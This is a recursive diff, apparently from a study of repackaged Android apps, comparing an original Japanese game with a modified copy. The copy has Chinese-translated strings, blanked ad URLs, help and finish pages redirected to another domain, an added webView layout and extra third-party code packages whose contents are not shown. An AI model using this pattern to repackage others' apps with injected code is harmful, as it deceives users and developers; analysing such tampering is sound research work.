+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/header.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/header.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/modoru.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/modoru.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/more_col.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/more_col.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/setting.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/setting.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/twitter_bt.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/twitter_bt.png são diferentes
+diff -r result/APP_78/App_B_78/res/layout/help.xml result/APP_78/App_M_78/res/layout/help.xml
+10c10
+<         <TextView android:textSize="12.0sp" android:textColor="#ff444444" android:id="@id/notify_desc" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="放置2時間後に通知" />
+---
+>         <TextView android:textSize="12.0sp" android:textColor="#ff444444" android:id="@id/notify_desc" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="放置2小时后通知" />
+12c12
+<         <TextView android:textSize="12.0sp" android:textColor="#ff444444" android:id="@id/volume_desc" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="全体の音ボリュームを調整" />
+---
+>         <TextView android:textSize="12.0sp" android:textColor="#ff444444" android:id="@id/volume_desc" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="调整整体音量" />
+Somente em result/APP_78/App_M_78/res/layout: pujiahtml.xml
+diff -r result/APP_78/App_B_78/res/values/ids.xml result/APP_78/App_M_78/res/values/ids.xml
+44a45
+>     <item type="id" name="pujiawebView" />
+diff -r result/APP_78/App_B_78/res/values/public.xml result/APP_78/App_M_78/res/values/public.xml
+57a58
+>     <public type="layout" name="pujiahtml" id="0x7f030006" />
+127a129
+>     <public type="id" name="pujiawebView" id="0x7f08002a" />
+diff -r result/APP_78/App_B_78/res/values/strings.xml result/APP_78/App_M_78/res/values/strings.xml
+3,9c3,9
+<     <string name="app_name">ふな育成2</string>
+<     <string name="ad_home">http://oz.qwecake.com/ad/0024_funa2/ad1.html</string>
+<     <string name="ad_home2">http://oz.qwecake.com/ad/0024_funa2/ad2.html</string>
+<     <string name="ad_icon_img_base">http://oz.qwecake.com/ad/0024_funa2/adIcon/homeicon</string>
+<     <string name="ad_icon_url_base">http://oz.qwecake.com/ad/0024_funa2/adIcon/homeicon</string>
+<     <string name="ad_icon_img_base2">http://oz.qwecake.com/ad/0024_funa2/adIcon/gnbanner</string>
+<     <string name="ad_icon_url_base2">http://oz.qwecake.com/ad/0024_funa2/adIcon/gnbanner</string>
+---
+>     <string name="app_name">船梨育成2</string>
+>     <string name="ad_home" />
+>     <string name="ad_home2" />
+>     <string name="ad_icon_img_base" />
+>     <string name="ad_icon_url_base" />
+>     <string name="ad_icon_img_base2" />
+>     <string name="ad_icon_url_base2" />
+12c12
+<     <string name="review_request">今後も無料でアップデートを提供できるよう、このアプリに５つ星の評価をお願いするなっしー(^O^)</string>
+---
+>     <string name="review_request">为了我们以后也能提供免费升级，请给这个游戏打５星评价哦梨～(^O^)</string>
+15,16c15,16
+<     <string name="url_help">http://oz.qwecake.com/ad/0024_funa2/help.html</string>
+<     <string name="url_finish">http://oz.qwecake.com/ad/0024_funa2/fin.html</string>
+---
+>     <string name="url_help">http://php.pujiahh.com/funafuna/help.html</string>
+>     <string name="url_finish">http://php.pujiahh.com/funafuna/fin.html</string>
+Somente em result/APP_78/App_M_78/smali/com: mgassistant
+Somente em result/APP_78/App_M_78/smali/com: pujiahh
+diff -r result/APP_78/App_B_78/smali/com/todayallo/funafuna/activities/MainActivity.smali result/APP_78/App_M_78/smali/com/todayallo/funafuna/activities/MainActivity.smali
+134c134
+<     const-string v5, "\u5f8c\u3067"
+---
+>     const-string v5, "\u7a0d\u540e"
+141c141
+<     const-string v5, "\u4ee5\u5f8c\u8868\u793a\u3057\u306a\u3044"
+---
+>     const-string v5, "\u4ee5\u540e\u4e0d\u518d\u663e\u793a"
+150c150
+<     const-string v5, "\u5354\u529b"
+---
+>     const-string v5, "\u534f\u52a9"
+diff -r result/APP_78/App_B_78/smali/com/todayallo/funafuna/activities/MoreActivity$2.smali result/APP_78/App_M_78/smali/com/todayallo/funafuna/activities/MoreActivity$2.smali
+107c107
+<     const-string v9, "\u300d\u3092\u6355\u307e\u3048\u305f\uff01"
+---
+>     const-string v9, "\u300d\u88ab\u6293\u4f4f\u4e86\uff01"
+diff -r result/APP_78/App_B_78/smali/com/todayallo/funafuna/activities/MoreActivity$3.smali result/APP_78/App_M_78/smali/com/todayallo/funafuna/activities/MoreActivity$3.smali
+107c107
+<     const-string v9, "\u300d\u3092\u6355\u307e\u3048\u305f\uff01"
+---
+>     const-string v9, "\u300d\u88ab\u6293\u4f4f\u4e86\uff01"
+diff -r result/APP_78/App_B_78/smali/com/todayallo/funafuna/activities/ZukanActivity.smali result/APP_78/App_M_78/smali/com/todayallo/funafuna/activities/ZukanActivity.smali
+1146c1146
+<     const-string v7, "\u3092"
+---
+>     const-string v7, ""
+1156c1156
+<     const-string v7, "\u4f53"
+---
+>     const-string v7, "\u53ea"
+1218c1218
+<     const-string v7, "\u3001"
+---
+>     const-string v7, ""
+1262c1262
+<     const-string v7, "\u3092"
+---
+>     const-string v7, ""
+1272c1272
+<     const-string v7, "\u4f53"
+---
+>     const-string v7, "\u53ea"
+1290c1290
+<     const-string v7, "\u3042\u3068\u3001"
+---
+>     const-string v7, "\u518d\u5c06"
+1300c1300
+<     const-string v7, "\u53ce\u7a6b\u3059\u308b\u3068\u51fa\u73fe!"
+---
+>     const-string v7, "\u6536\u83b7\u540e\u4f1a\u51fa\u73b0!"
+diff -r result/APP_78/App_B_78/smali/com/todayallo/funafuna/services/NotifyService.smali result/APP_78/App_M_78/smali/com/todayallo/funafuna/services/NotifyService.smali
+86c86
+<     const-string v4, "\u3075\u306a\u3063\u3057\u30fc\u304c\u53ce\u7a6b\u3092\u5f85\u3063\u3066\u307e\u3059!!"
+---
+>     const-string v4, "\u8239\u68a8\u7cbe\u7b49\u7740\u4f60\u6765\u6536\u83b7\u5462!!"
+98c98
+<     const-string v5, "\u3075\u306a\u3063\u3057\u30fc\u304c\u53ce\u7a6b\u3092\u5f85\u3063\u3066\u307e\u3059!!"
+---
+>     const-string v5, "\u8239\u68a8\u7cbe\u7b49\u7740\u4f60\u6765\u6536\u83b7\u5462!!"
+Somente em result/APP_78/App_M_78/smali/com: umeng
